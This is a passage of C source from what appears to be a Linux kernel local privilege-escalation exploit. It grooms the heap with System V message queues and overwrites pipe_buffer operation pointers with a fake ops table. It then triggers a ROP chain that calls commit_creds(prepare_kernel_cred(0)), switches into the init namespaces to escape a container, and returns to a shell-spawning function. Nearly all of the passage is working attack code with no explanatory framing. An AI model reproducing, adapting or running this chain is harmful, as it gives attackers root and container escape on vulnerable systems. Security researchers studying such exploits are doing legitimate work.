		if (fcntl(pipefds[i][1], F_SETPIPE_SZ, 0x40 * 0x1000) < 0) {
			perror("fcntl");
			exit(-1);
		}
	}

	printf("[+] Verifying successfully allocating pipe buffers in unaligned 4k chunk\n");
	int target_4k_qid = 0;
	for (int i = 0; i < 0x50; i++) {
		memset(msg_buf, 0, sizeof(msgbuf));
		if (msgrcv(msgqids4[i], msg_buf, REAL_SIZE_TO_MSG_SIZE(0x1000), 0, IPC_NOWAIT|MSG_COPY|MSG_NOERROR) < 0) {
			perror("msgrcv 0x1000");
			exit(-1);
		};
		// 0x100 - sizeof(struct msg_msg) because the unaligned chunk starts at offset 0x100,
		// and the msg_msg we use to read into that chunk will only return data from offset=sizeof(msg_msg)
		// I add another 0x10 to find the 'ops' field inside the pipe_buffer struct
		if ((*(uint64_t*)(msg->mtext + 0x100 - sizeof(struct msg_msg) + 0x10) == (uint64_t)leaked_func_ptr)) {
			printf("[*] Found unaligned chunk in qid %d, mtype %ld\n", msgqids4[i], msg->mtype);
			target_4k_qid = msgqids4[i];
			break;
		}
	}
	if (target_4k_qid == 0) {
		printf("Failed finding allocated pipe buffers in unaligned 4k heap\n");
		CHECK_INPUT_FOR_CONT;
		exit(-1);
	}

	printf("[+] Releasing msg_msg before our pipe_buffer object\n");
	memset(msg_buf, 0, sizeof(msgbuf));
	if (msgrcv(target_4k_qid, msg_buf, REAL_SIZE_TO_MSG_SIZE(0x1000), 0, IPC_NOWAIT|MSG_NOERROR) < 0) {
			perror("msgrcv 0x1000 4k qid");
			exit(-1);
	};
	// TODO: add the same verification as before here

	printf("[+] Overwriting pipe buffers with rop chain\n");
	// Prepare rop chain
	memset(msg_buf, 0, sizeof(msgbuf));
	// Fake ops struct
	uint64_t* fake_ops = (uint64_t*)msg->mtext;
	*fake_ops++ = 0xdeadcafeAAAAAAAA;	// confirm
	*fake_ops++ = kbase_addr + offset_stack_pivot_1; // release
	*fake_ops++ = 0xdeadcafeBBBBBBBB;	// try_steal
	*fake_ops++ = 0xdeadcafeCCCCCCCC;	// get

	// Fake pipe_buffer ops
	uint64_t * fake_pipe_buffer_ops = (uint64_t*)(msg->mtext + 0x100 - sizeof(struct msg_msg));
	*(uint64_t*)((char*)fake_pipe_buffer_ops - 0x77) = kbase_addr + offset_stack_pivot_2;
	*fake_pipe_buffer_ops++ = kbase_addr + offset_stack_pivot_2;
	*fake_pipe_buffer_ops++ = (uint64_t)leaked_4k_chunk + 0x200;	// Real rop chain
	*fake_pipe_buffer_ops = (uint64_t)leaked_4k_chunk + sizeof(struct msg_msg); // will point to fake_ops

	*(uint64_t*)(msg->mtext + 0x400 - sizeof(struct msg_msg)) = kbase_addr + offset_pop_rdi;	// For moving rax (func ret value) into rdi (func first arg)

	uint64_t * rop = (uint64_t*)(msg->mtext + 0x200 - sizeof(struct msg_msg));
	// commit_creds(prepare_kernel_cred(0))
	*rop++ = kbase_addr + offset_pop_rdi;
	*rop++ = 0;
	*rop++ = kbase_addr + offset_prepare_kernel_cred;
	*rop++ = kbase_addr + offset_pop_rsi;
	*rop++ = (uint64_t)leaked_4k_chunk + 0x400 + 0x7f;
	*rop++ = kbase_addr + offset_push_rax_jmp_qword_ptr_rsi;
	*rop++ = kbase_addr + offset_commit_creds;

	// switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
	*rop++ = kbase_addr + offset_pop_rdi;
	*rop++ = 1;
	*rop++ = kbase_addr + offset_find_task_by_vpid;
	*rop++ = kbase_addr + offset_pop_rsi;
	*rop++ = (uint64_t)leaked_4k_chunk + 0x400 + 0x7f;
	*rop++ = kbase_addr + offset_push_rax_jmp_qword_ptr_rsi;
	*rop++ = kbase_addr + offset_pop_rsi;
	*rop++ = kbase_addr + offset_init_nsproxy;
	*rop++ = kbase_addr + offset_switch_task_namespaces;

	// swapgs_restore_regs_and_return_to_usermode()
	*rop++ = kbase_addr + offset_swapgs_restore_regs_and_return_to_usermode;
	*rop++ = 0; // rax
	*rop++ = 0; // rdi

	save_state();
	*rop++ = (uint64_t)pop_shell; // rip - rop chain will return to here
	*rop++ = cs; // cs
	*rop++ = rflags; // rflags
	*rop++ = rsp; // rsp
	*rop++ = ss; // ss

	int * msgqids5 = (int*)malloc(sizeof(int) * 0x30);
	for (int i = 0; i < 0x30; i++) {
		int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
		if (qid == -1) {
			perror("msgget");
			CHECK_INPUT_FOR_CONT;
			exit(-1);
		}
		msgqids5[i] = qid;
		msg->mtype = 0x25000 + i;
		if (msgsnd(qid, msg_buf, REAL_SIZE_TO_MSG_SIZE(0x1000), IPC_NOWAIT) < 0) {
			perror("msgsnd msgqids5");
			CHECK_INPUT_FOR_CONT;
			exit(-1);
		}
	}

	printf("[!!!] Triggering rop chain\n");
	for (int i=0; i<0x20; i++) {
		if (close(pipefds[i][0]) < 0) {
			perror("close pipefd[0]");
			exit(-1);
		}
		if (close(pipefds[i][1]) < 0) {
			perror("close pipefd[0]");
			exit(-1);
		}
	}

	printf("If I'm printed, it means we didn't trigger the rop chain\n");

	mnl_socket_close(nl);
	return EXIT_SUCCESS;
}
